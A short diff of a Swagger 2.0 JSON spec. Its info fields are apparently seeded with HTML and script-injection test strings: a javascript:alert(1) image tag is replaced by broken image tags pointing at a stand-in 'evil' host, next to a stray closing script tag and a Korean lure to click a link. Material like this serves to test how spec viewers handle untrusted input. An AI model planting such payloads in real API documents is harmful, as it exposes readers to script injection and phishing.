@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "아래 [kakaovx 홈으로 이동] 링크를 클릭하세요",
-  "description": "</p><IMG SRC='javascript:alert(1)'<p>",
+  "description": "</p><img src='//evil? <image src='//evil?<p>",
   "test": "</script>"},
   "contact": 
   {"name": "AHNLAB",
